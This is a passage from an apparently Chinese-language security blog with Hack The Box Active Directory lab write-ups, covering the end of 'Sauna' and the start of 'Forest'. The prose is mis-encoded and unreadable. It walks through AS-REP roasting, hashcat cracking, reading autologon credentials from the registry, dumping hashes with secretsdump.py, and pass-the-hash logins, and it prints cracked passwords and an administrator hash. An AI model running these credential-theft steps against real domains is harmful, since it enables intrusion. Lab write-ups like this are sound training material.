B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic</span><br><span class="line"> e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN</span><br><span class="line"> =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">ms-DS-MachineAccountQuota: 10</span><br><span class="line">msDS-Behavior-Version: 7</span><br><span class="line">msDS-PerUserTrustQuota: 1</span><br><span class="line">msDS-AllUsersTrustQuota: 1000</span><br><span class="line">msDS-PerUserTrustTombstonesQuota: 10</span><br><span class="line">msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na</span><br><span class="line"> me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N</span><br><span class="line"> ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-NcType: 0</span><br><span class="line">msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE</span><br><span class="line">dc: EGOTISTICAL-BANK</span><br><span class="line"><span class="comment"># Users, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Computers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Domain Controllers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># System, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># LostAndFound, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Infrastructure, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Program Data, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># NTDS Quotas, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Managed Service Accounts, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Keys, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># TPM Devices, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Builtin, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Hugo Smith, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC</span><br><span class="line"> AL</span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"><span class="comment"># numResponses: 19</span></span><br><span class="line"><span class="comment"># numEntries: 15</span></span><br><span class="line"><span class="comment"># numReferences: 3</span></span><br></pre></td></tr></table></figure>
<!--more-->

<p>æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå¯ç–‘çš„ç”¨æˆ·ã€‚è™½ç„¶æ˜¯æ‰¾åˆ°äº†ç”¨æˆ·åï¼Œä½†æ˜¯æˆ‘ä»¬ä¸æ²¡æœ‰æ‰¾åˆ°ç›¸å¯¹åº”çš„å‡­æ®ã€‚è¿™æ—¶å€™æˆ‘ä»¬åˆ‡æ¢ä¸€ä¸‹æ€è·¯ï¼Œæµè§ˆä¸€ä¸‹webæœåŠ¡ä¸­æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯å¯ä»¥æä¾›ç»™æˆ‘ä»¬çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/b628002a16b3488681fd917e8308c38f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨å…³äºé¡µé¢ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†è¿™ä¸¤ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œé•¿å¾—è²Œä¼¼å’Œæˆ‘ä»¬ä¿¡æ¯æ”¶é›†å‡ºæ¥çš„ç”¨æˆ·ä¿¡æ¯æœ‰ç‚¹ç±»ä¼¼ã€‚é‚£æˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™æœ‰å¯èƒ½æ˜¯ç³»ç»Ÿä¸­çœŸå®å­˜åœ¨çš„ç”¨æˆ·ã€‚<br><img src="https://img-blog.csdnimg.cn/c588d6ef57d149fabf5e731d9cc5036d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•è·å–ä¸€ä¸‹ç”¨æˆ·å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œä½¿ç”¨çš„å·¥å…·æ˜¯kerbruteï¼Œå‘ç°å­˜åœ¨<code>hsmith</code>å’Œ<code>fsmith</code>è¿™ä¸¤ä¸ªç”¨æˆ·å¹¶ä¸”å‘ç°äº†å®ƒä»¬çš„TGTæ¡ç›®ã€‚<img src="https://img-blog.csdnimg.cn/2627486af25c47ab96b900a0ec75f39b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å…ˆä½¿ç”¨impacketåŒ…ä¸­çš„<code>GetNPUsers.py</code>è·å–fsmithç”¨æˆ·çš„hashå€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/c0949aa761a34cd5ac4cb072c102afb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†ä»–çš„hashå€¼ä¿å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨hashcatå°è¯•èƒ½ä¸èƒ½ç ´è§£æˆåŠŸã€‚ç ´è§£æˆåŠŸçš„å¯†ç æ˜æ–‡å€¼ä¸º<code>Thestrokes23</code>ã€‚è¿™é‡Œè§£é‡Šä¸€ä¸‹å‚æ•°çš„å«ä¹‰ï¼Œ-mæŒ‡çš„æ˜¯æŒ‡å®šæ–‡ä»¶çš„æ•£åˆ—å€¼ç±»å‹ï¼Œ-aæŒ‡çš„æ˜¯æŒ‡å®šç ´è§£æ¨¡å¼ï¼Œ-wæ˜¯æŒ‡å®šå­—å…¸ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 fsmith.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/41e6765292b042028af2e5a18a7e63c0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/e09120c6a3ab4d2ebc84502a9a0a58b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/353674983008426c8e5578b2c332cf9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ—¢ç„¶ç ´è§£åˆ°äº†å¯†ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç™»å½•SMBå’ŒWinRMæœåŠ¡äº†ã€‚æˆ‘ä»¬å…ˆæŸ¥çœ‹SMBæœåŠ¡ï¼Œå‘ç°äº†ä¸¤ä¸ªå…±äº«æœåŠ¡ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªæ˜¯æœ‰ç”¨çš„ã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/03e072a109fb4bbea8beb8f0a955ab09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å°è¯•åˆ©ç”¨WinRMå§ï¼Œç™»å½•æˆåŠŸï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ªflagå€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/6b0e08188c09403f95a20de67f6292de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬æ‹¿åˆ°çš„åªæ˜¯æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å½“ç„¶æ˜¯ç®¡ç†å‘˜æƒé™ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹çœ‹éƒ½å­˜åœ¨å“ªäº›ç”¨æˆ·ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªsvc_loanmgrç”¨æˆ·ã€‚<br><img src="https://img-blog.csdnimg.cn/db445cc21449494680e87b2d7ae329f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨powershellå‘½ä»¤æŸ¥çœ‹åˆ°å®ƒå¯¹åº”çš„å¯†ç ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27;</span> | <span class="built_in">select</span> <span class="string">&quot;Default*&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d774cd7d287541eb8c6c68b368fe0424.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªå‘½ä»¤è¦è®°ä½å®ƒè¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸Šä¼ <code>WindowsEnum.ps1</code>è„šæœ¬æ¥å®Œæˆè¿™ä»»åŠ¡ã€‚<br><img src="https://img-blog.csdnimg.cn/86d1160f61414340a78ab8afd834f34a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/8c4904ed1ffe46219f42192926e2b54c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°è¿™ä¸ªå¯†ç åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ç™»é™†è¿›å»ã€‚ä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ˜¯ç™»é™†å¤±è´¥<br><img src="https://img-blog.csdnimg.cn/431a23d1a026444781060ce56c83ade6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æ²¡åŠæ³•äº†ï¼Œæˆ‘å°è¯•ä½¿ç”¨<code>secretsdump.py</code>è„šæœ¬çœ‹çœ‹èƒ½ä¸èƒ½æˆåŠŸè·å–åˆ°è¿™ä¸ªç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚æˆ‘ä»¬æ„å¤–å‘ç°administratorçš„hashå€¼ï¼Œå‘å¤§è´¢äº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.175 svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/24f4c7e28cee4d33bef37d56e48ad59a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨<code>evil-winrm</code>è¿›è¡Œç™»å½•ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>wmiexec.py</code>è¿™ä¸ªè„šæœ¬è¿›è¡Œç™»å½•ï¼Œä½†æ˜¯åè€…çš„é€Ÿåº¦è¦ç›¸è¾ƒå‰è€…æ…¢å¾—å¤š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/42316c86c9ba4720b9fd0f6684ecec19.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes :823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b57c846f068946208ef0673c1765edf0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Forest</title>
    <url>/2021/12/24/Forest/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/2913cb4eedb44306869932340084824e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -Pn -A -p1-65535 10.10.10.161</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-21 11:03:55Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49706/tcp open  unknown</span><br><span class="line">49931/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=10/21%OT=53%CT=1%CU=36900%PV=Y%DS=2%DC=T%G=Y%TM=617148</span><br><span class="line">OS:13%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S%TS</span><br><span class="line">OS:=A)SEQ(SP=104%GCD=1%ISR=104%TI=I%CI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8</span><br><span class="line">OS:ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=20</span><br><span class="line">OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5</span><br><span class="line">OS:4DNW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D</span><br><span class="line">OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O</span><br><span class="line">OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)</span><br><span class="line">OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U</span><br><span class="line">OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h26m49s, deviation: 4h02m32s, median: 6m47s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2021-10-21T04:05:16-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-10-21T11:05:15</span><br><span class="line">|_  start_date: 2021-10-21T07:03:53</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1723/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   321.85 ms 10.10.14.1</span><br><span class="line">2   321.83 ms 10.10.10.161</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3716.43 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>æˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒåŒ¿åç™»å½•ï¼Œæˆ‘ä»¬å°è¯•åŒ¿åç™»å½•SMBæœåŠ¡ï¼Œçœ‹çœ‹æœ‰å“ªäº›æœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/e568f2f0f0ef419da569481703bc97f1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç­”æ¡ˆæ˜¯æ²¡æœ‰ï¼Œæ²¡æœ‰ä»€ä¹ˆå…±äº«ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/9315d9655d274be9baf1173d824bbf38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>ä¸Šé¢ä¿¡æ¯æ”¶é›†æ—¶å‘ç°äº†ldapæœåŠ¡ï¼Œé‚£æˆ‘ä»¬å°è¯•ä½¿ç”¨ldapsearchå·¥å…·å¯¹<code>namingcontexts</code>å­—æ®µè¿›è¡Œå‘æ˜<br><img src="https://img-blog.csdnimg.cn/5159dbdc249c4274ba73c56d802ba67c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•æ›´æ·±å…¥åœ°æŒ–æ˜DNä¿¡æ¯ï¼Œå¹¶å°è¯•è·å–åŸŸä¸­çš„ç”¨æˆ·åˆ—è¡¨<br><img src="https://img-blog.csdnimg.cn/412eb99806c84827a8d4924b17aab912.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>enum4linux</code>è·å–ç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/295e9874f8a94b21b77a12fd68e7de09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†æœé›†çš„ä¿¡æ¯ä¿å­˜ä¸ºä¸€ä¸ª<code>anon_ldap.txt</code>æ–‡ä»¶ï¼Œè¿‡æ»¤å‡º<code>svc-alfresco</code>ç”¨æˆ·çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/323186c2631f445e8f56396ebc761eef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬æ‹¿åˆ°è´¦å·å’Œç”¨æˆ·ååï¼Œæˆ‘ä»¬å¾—æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¯ç”¨äº†é¢„è®¤è¯ï¼Œè¿™é‡Œè§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯é¢„è®¤è¯</p>
<blockquote>
